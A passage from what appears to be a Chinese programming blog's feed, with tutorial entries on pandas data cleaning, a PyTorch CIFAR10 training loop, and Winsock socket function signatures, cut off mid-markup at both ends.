清洗错误数据</h3><p>数据错误也是很常见的情况，我们可以对错误的数据进行替换或移除。以下实例会替换错误年龄的数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">person = &#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: [<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span> , <span class="string">&#x27;Taobao&#x27;</span>],</span><br><span class="line">  <span class="string">&quot;age&quot;</span>: [<span class="number">50</span>, <span class="number">40</span>, <span class="number">12345</span>]    <span class="comment"># 12345 年龄数据是错误的</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(person)</span><br><span class="line"></span><br><span class="line">df.loc[<span class="number">2</span>, <span class="string">&#x27;age&#x27;</span>] = <span class="number">30</span> <span class="comment"># 修改数据</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df.to_string())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 age 大于 120 的设置为 120</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">person = &#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: [<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span> , <span class="string">&#x27;Taobao&#x27;</span>],</span><br><span class="line">  <span class="string">&quot;age&quot;</span>: [<span class="number">50</span>, <span class="number">200</span>, <span class="number">12345</span>]    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(person)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> df.index:</span><br><span class="line">  <span class="keyword">if</span> df.loc[x, <span class="string">&quot;age&quot;</span>] &gt; <span class="number">120</span>:</span><br><span class="line">    df.loc[x, <span class="string">&quot;age&quot;</span>] = <span class="number">120</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df.to_string())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 age 大于 120 的删除</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">person = &#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: [<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span> , <span class="string">&#x27;Taobao&#x27;</span>],</span><br><span class="line">  <span class="string">&quot;age&quot;</span>: [<span class="number">50</span>, <span class="number">40</span>, <span class="number">12345</span>]    <span class="comment"># 12345 年龄数据是错误的</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(person)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> df.index:</span><br><span class="line">  <span class="keyword">if</span> df.loc[x, <span class="string">&quot;age&quot;</span>] &gt; <span class="number">120</span>:</span><br><span class="line">    df.drop(x, inplace = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df.to_string())</span><br></pre></td></tr></table></figure><h3 id="Pandas-清洗重复数据"><a href="#Pandas-清洗重复数据" class="headerlink" title="Pandas 清洗重复数据"></a>Pandas 清洗重复数据</h3><p>如果我们要清洗重复数据，可以使用 <strong>duplicated()</strong> 和 <strong>drop_duplicates()</strong> 方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果对应的数据是重复的，duplicated() 会返回 True，否则返回 False。</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">person = &#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: [<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>, <span class="string">&#x27;Taobao&#x27;</span>],</span><br><span class="line">  <span class="string">&quot;age&quot;</span>: [<span class="number">50</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="number">23</span>]  </span><br><span class="line">&#125;</span><br><span class="line">df = pd.DataFrame(person)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df.duplicated())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除重复数据，可以直接使用drop_duplicates() 方法</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">persons = &#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: [<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>, <span class="string">&#x27;Taobao&#x27;</span>],</span><br><span class="line">  <span class="string">&quot;age&quot;</span>: [<span class="number">50</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="number">23</span>]  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(persons)</span><br><span class="line"></span><br><span class="line">df.drop_duplicates(inplace = <span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(df)</span><br></pre></td></tr></table></figure><h2 id="Pandas常用函数"><a href="#Pandas常用函数" class="headerlink" title="Pandas常用函数"></a>Pandas常用函数</h2><p><a href="https://www.runoob.com/pandas/pandas-functions.html">Pandas 常用函数 | 菜鸟教程 (runoob.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 深度学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pandas </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pytorch深度学习</title>
      <link href="/2023/03/22/pytorch-shen-du-xue-xi/"/>
      <url>/2023/03/22/pytorch-shen-du-xue-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="Pytorch学习"><a href="#Pytorch学习" class="headerlink" title="Pytorch学习"></a>Pytorch学习</h1><h2 id="Python学习法宝函数"><a href="#Python学习法宝函数" class="headerlink" title="Python学习法宝函数"></a>Python学习法宝函数</h2><p>学会使用<code>dir()</code>和<code>help()</code></p><h2 id="Pytorch加载数据"><a href="#Pytorch加载数据" class="headerlink" title="Pytorch加载数据"></a>Pytorch加载数据</h2><ul><li>Dataset：提供一种方式去获取数据及其label<ul><li>如何获取每一个数据及其label</li><li>告诉我们总共有多少数据</li></ul></li><li>Dataloader：为后面的网络提供不同的数据形式</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> Dataset</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyData</span>(<span class="title class_ inherited__">Dataset</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, root_dir, label_dir</span>):</span><br><span class="line">        self.root_dir = root_dir</span><br><span class="line">        self.label_dir = label_dir</span><br><span class="line">        self.path = os.path.join(self.root_dir, self.label_dir)</span><br><span class="line">        self.img_path = os.listdir(self.path)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, idx</span>):</span><br><span class="line">        img_name = self.img_path[idx]</span><br><span class="line">        img_item_path = os.path.join(self.root_dir, self.label_dir, img_name)</span><br><span class="line">        img = Image.<span class="built_in">open</span>(img_item_path)</span><br><span class="line">        label = self.label_dir</span><br><span class="line">        <span class="keyword">return</span> img, label</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.img_path)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">root_dir = <span class="string">&quot;dataset/train&quot;</span></span><br><span class="line">ants_label_dir = <span class="string">&quot;ants&quot;</span></span><br><span class="line">bees_label_dir = <span class="string">&quot;bees&quot;</span></span><br><span class="line">ants_dataset = MyData(root_dir, ants_label_dir)</span><br><span class="line">bees_dataset = MyData(root_dir, bees_label_dir)</span><br><span class="line">train_dataset = ants_dataset + bees_dataset</span><br></pre></td></tr></table></figure><h2 id="完整模型训练"><a href="#完整模型训练" class="headerlink" title="完整模型训练"></a>完整模型训练</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> DataLoader</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">from</span> torch.utils.tensorboard <span class="keyword">import</span> SummaryWriter   </span><br><span class="line"></span><br><span class="line"><span class="comment"># 准备数据集</span></span><br><span class="line">train_data = torchvision.datasets.CIFAR10(root=<span class="string">&quot;./data&quot;</span>, train=<span class="literal">True</span>, transform=torchvision.transforms.ToTensor(), download=<span class="literal">True</span>)</span><br><span class="line">test_data = torchvision.datasets.CIFAR10(root=<span class="string">&quot;./data&quot;</span>, train=<span class="literal">False</span>, transform=torchvision.transforms.ToTensor(), download=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># length</span></span><br><span class="line">train_data_size = <span class="built_in">len</span>(train_data)</span><br><span class="line">test_data_size = <span class="built_in">len</span>(test_data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;训练数据集的长度为:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(train_data_size))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;测试数据集的长度为:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(test_data_size))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用DataLoader加载数据集</span></span><br><span class="line">train_dataloader = DataLoader(train_data, batch_size=<span class="number">64</span>)</span><br><span class="line">test_dataloader = DataLoader(test_data, batch_size=<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搭建神经网络</span></span><br><span class="line"><span class="comment"># model.py &amp; from model import *</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Net</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(Net, self).__init__()</span><br><span class="line">        self.model = nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>, <span class="number">32</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">32</span>, <span class="number">32</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">32</span>, <span class="number">64</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">            nn.Flatten(),</span><br><span class="line">            nn.Linear(<span class="number">64</span>*<span class="number">4</span>*<span class="number">4</span>, <span class="number">64</span>),</span><br><span class="line">            nn.Linear(<span class="number">64</span>, <span class="number">10</span>)</span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.model(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 创建网络模型</span></span><br><span class="line">net = Net()</span><br><span class="line"><span class="comment"># 损失函数</span></span><br><span class="line">loss_fn = nn.CrossEntropyLoss()</span><br><span class="line"><span class="comment"># 优化器 lr=1e-2</span></span><br><span class="line">learning_rate = <span class="number">0.01</span></span><br><span class="line">optimizer = torch.optim.SGD(net.parameters(), lr=learning_rate)</span><br><span class="line"><span class="comment"># 添加tensorboard</span></span><br><span class="line">writer = SummaryWriter(<span class="string">&quot;./logs_train&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置训练网络的一些参数</span></span><br><span class="line"><span class="comment"># 记录训练的次数</span></span><br><span class="line">total_train_step = <span class="number">0</span></span><br><span class="line"><span class="comment"># 记录测试的次数</span></span><br><span class="line">total_test_step = <span class="number">0</span></span><br><span class="line"><span class="comment"># 训练的轮数</span></span><br><span class="line">epoch = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(epoch):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----第&#123;&#125;轮训练开始-----&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>))</span><br><span class="line">    <span class="comment"># 训练步骤开始</span></span><br><span class="line">    net.train()</span><br><span class="line">    <span class="keyword">for</span> data <span class="keyword">in</span> train_dataloader:</span><br><span class="line">        imgs, targets = data</span><br><span class="line">        outputs = net(imgs)</span><br><span class="line">        loss = loss_fn(outputs, targets)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 优化器优化模型</span></span><br><span class="line">        optimizer.zero_grad()</span><br><span class="line">        loss.backward()</span><br><span class="line">        optimizer.step()</span><br><span class="line">        </span><br><span class="line">        total_train_step = total_train_step + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> total_train_step % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;训练次数:&#123;&#125;, loss:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(total_train_step, loss.item()))</span><br><span class="line">            writer.add_scalar(<span class="string">&quot;train_loss&quot;</span>, loss.item(), total_train_step)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 测试步骤开始</span></span><br><span class="line">    net.<span class="built_in">eval</span>()</span><br><span class="line">    total_test_loss = <span class="number">0</span></span><br><span class="line">    total_accuracy = <span class="number">0</span></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        <span class="keyword">for</span> data <span class="keyword">in</span> test_dataloader:</span><br><span class="line">            imgs, targets = data</span><br><span class="line">            outputs = net(imgs)</span><br><span class="line">            loss = loss_fn(outputs, targets)</span><br><span class="line">            total_test_loss = total_test_loss + loss.item()</span><br><span class="line">            accuracy = (outputs.argmax(<span class="number">1</span>) == targets).<span class="built_in">sum</span>()</span><br><span class="line">            total_accuracy = total_accuracy + accuracy</span><br><span class="line">            </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;整体测试集上的Loss:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(total_test_loss))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;整体测试集上的正确率:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(total_accuracy/test_data_size))</span><br><span class="line">    writer.add_scalar(<span class="string">&quot;test_loss&quot;</span>, total_test_loss, total_test_step)</span><br><span class="line">    writer.add_scalar(<span class="string">&quot;test_accuracy&quot;</span>, total_accuracy/test_data_size, total_test_step)</span><br><span class="line">    total_test_step = total_test_step + <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    torch.save(net, <span class="string">&quot;net_&#123;&#125;.pth&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">    <span class="comment"># torch.save(net.state_dict(), &quot;net_&#123;&#125;.pth&quot;.format(i))</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;第&#123;&#125;轮模型已保存&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line"> </span><br><span class="line">writer.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 深度学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pytorch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络编程</title>
      <link href="/2023/03/21/wang-luo-bian-cheng/"/>
      <url>/2023/03/21/wang-luo-bian-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="Socket编程"><a href="#Socket编程" class="headerlink" title="Socket编程"></a>Socket编程</h1><h2 id="TCP和UDP"><a href="#TCP和UDP" class="headerlink" title="TCP和UDP"></a>TCP和UDP</h2><p><img src="/2023/03/21/wang-luo-bian-cheng/1666262324506-8ff981e7-c385-41d5-ba1a-1afd5052b172.png" class="lazyload placeholder" data-srcset="/2023/03/21/wang-luo-bian-cheng/1666262324506-8ff981e7-c385-41d5-ba1a-1afd5052b172.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"><br><img src="/2023/03/21/wang-luo-bian-cheng/1666262235415-f7aeab6a-76ba-4c2d-927d-a36c7722e86f.png" class="lazyload placeholder" data-srcset="/2023/03/21/wang-luo-bian-cheng/1666262235415-f7aeab6a-76ba-4c2d-927d-a36c7722e86f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"><br><strong>使用UDP服务的应用程序编写步骤</strong><br><img src="/2023/03/21/wang-luo-bian-cheng/1666262120401-8b9873b2-285d-42cf-a667-407a7e99ce48.png" class="lazyload placeholder" data-srcset="/2023/03/21/wang-luo-bian-cheng/1666262120401-8b9873b2-285d-42cf-a667-407a7e99ce48.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"><br><strong>使用TCP服务的应用程序编写步骤</strong><br><img src="/2023/03/21/wang-luo-bian-cheng/1666262180171-80f64210-48b5-4159-aa87-c0c5e6251815.png" class="lazyload placeholder" data-srcset="/2023/03/21/wang-luo-bian-cheng/1666262180171-80f64210-48b5-4159-aa87-c0c5e6251815.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="C中常用的socket函数"><a href="#C中常用的socket函数" class="headerlink" title="C中常用的socket函数"></a>C中常用的socket函数</h2><p>包括：<code>WSAStartup</code>、<code>WSAcleanup</code>、<code>socket</code>、<code>bind</code>、<code>listen</code>、<code>connect</code>、<code>accept</code>、<br><code>sendto</code>、<code>recvfrom</code>、<code>send</code>、<code>closesocket</code>等函数</p><h3 id="WSAStartup"><a href="#WSAStartup" class="headerlink" title="WSAStartup"></a>WSAStartup</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> WSAAPI <span class="title function_">WSAStartup</span> <span class="params">(<span class="comment">//成功返回0，否则为错误代码</span></span></span><br><span class="line"><span class="params">    WORD wVersionRequested,<span class="comment">//调用者希望使用的最高版本</span></span></span><br><span class="line"><span class="params">    LPWSADATA lpWSAData<span class="comment">//可用Socket的详细信息</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>功能：初始化Socket DLL，协商使用的Socket版本<br>如果调用成功，不再使用时需要调用<code>WSACleanup</code>释放Socket DLL资源<br>WSADATA：</p><ul><li>wVersion：推荐调用者使用的Socket版本号</li><li>wHighVersion：系统实现的Socket最高版本号<h3 id="WSACleanup"><a href="#WSACleanup" class="headerlink" title="WSACleanup"></a>WSACleanup</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> WSAAPI <span class="title function_">WSACleanup</span><span class="params">(<span class="comment">//成功返回0</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>功能：结束使用Socket，释放Socket DLL资源<br>调用失败后可利用<code>WSAGetLastError</code>获取详细错误信息<h3 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SOCKET WSAAPI <span class="title function_">socket</span><span class="params">(</span></span><br><span class="line"><span class="params"><span class="type">int</span> af,<span class="comment">//地址类型。AF_INET、AF_INET6等</span></span></span><br><span class="line"><span class="params"><span class="type">int</span> type,<span class="comment">//服务类型。SOCK_STREAM、SOCK_DGRAM等</span></span></span><br><span class="line"><span class="params"><span class="type">int</span> protocol<span class="comment">//协议。IPPROTO_TCP、IPPROTO_UDP、IPPROTO_ICMP等。如为0，则由系统自动选择</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>功能：创建一个Socket，并绑定到一个特定的传输层服务<br>正确返回Socket描述符，错误返回<code>INVALID_SOCKET</code>。可通过<code>WSAGetLastError</code>获取错误详情<h3 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">bind</span><span class="params">(</span></span><br><span class="line"><span class="params">SOCKET         s,<span class="comment">//socket描述符</span></span></span><br><span class="line"><span class="params"><span class="type">const</span> sockaddr *addr,<span class="comment">//地址(IP地址和端口号)。如为INADDR_ANY和in6addr_any则由系统自动分配。</span></span></span><br><span class="line"><span class="params"><span class="type">int</span>            namelen<span class="comment">//地址长度。通常为sockaddr结构的长度</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>功能：将一个本地地址绑定到指定的Socket<br>正确返回0，错误返回<code>SOCKET_ERROR</code>。可通过<code>WSAGetLastError</code>获取错误详情<h3 id="listen"><a href="#listen" class="headerlink" title="listen"></a>listen</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> WSAAPI <span class="title function_">listen</span><span class="params">(<span class="comment">//流方式，Server端</span></span></span><br><span class="line"><span class="params">SOCKET s,<span class="comment">//socket描述符</span></span></span><br><span class="line"><span class="params"><span class="type">int</span>   backlog<span class="comment">//连接等待队列的最大长度</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>功能：使socket进入监听状态，监听远程连接是否到来<br>正确返回0，错误返回<code>SOCKET_ERROR</code>。可通过<code>WSAGetLastError</code>获取错误详情<h3 id="connect"><a href="#connect" class="headerlink" title="connect"></a>connect</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> WSAAPI <span class="title function_">connect</span><span class="params">(<span class="comment">//流方式、Client端</span></span></span><br><span class="line"><span class="params">SOCKET         s,<span class="comment">//socket描述符</span></span></span><br><span class="line"><span class="params"><span class="type">const</span> sockaddr *name, <span class="comment">//地址。包括IP地址和端口号。</span></span></span><br><span class="line"><span class="params"><span class="type">int</span>            namelen<span class="comment">//地址长度。通常为sockaddr结构的长度</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>功能：向一个特定的socket发出建连请求<br>正确返回0，错误返回<code>SOCKET_ERROR</code>。可通过<code>WSAGetLastError</code>获取错误详情<h3 id="accept"><a href="#accept" class="headerlink" title="accept"></a>accept</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SOCKET WSAAPI <span class="title function_">accept</span><span class="params">(<span class="comment">//流方式、Server端。通常运行后进入阻塞状态，直到连接请求到来</span></span></span><br><span class="line"><span class="params">SOCKET   s,<span class="comment">//socket描述符</span></span></span><br><span class="line"><span class="params">sockaddr *addr,<span class="comment">//返回远程端地址</span></span></span><br><span class="line"><span class="params"><span class="type">int</span>      *addrlen<span class="comment">//返回地址长度</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>功能：接受一个特定socket请求等待队列中的连接请求<br>正确返回新连接的socket描述符。错误返回<code>INVALID_SOCKET</code>，可通过<code>WSAGetLastError</code>获取错误详情<h3 id="sendto"><a href="#sendto" class="headerlink" title="sendto"></a>sendto</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> WSAAPI <span class="title function_">sendto</span><span class="params">(<span class="comment">//数据报方式</span></span></span><br><span class="line"><span class="params">SOCKET         s, <span class="comment">//socket描述符</span></span></span><br><span class="line"><span class="params"><span class="type">const</span> <span class="type">char</span>     *buf, <span class="comment">//发送数据缓存区</span></span></span><br><span class="line"><span class="params"><span class="type">int</span>            len, <span class="comment">//发送缓冲区的长度</span></span></span><br><span class="line"><span class="params"><span class="type">int</span>            flags, <span class="comment">//对调用的处理方式，如OOB等</span></span></span><br><span class="line"><span class="params"><span class="type">const</span> sockaddr *to, <span class="comment">//目标socket的地址</span></span></span><br><span class="line"><span class="params"><span class="type">int</span>            tolen <span class="comment">//目标地址的长度</span></span></span><br><span class="line"><span 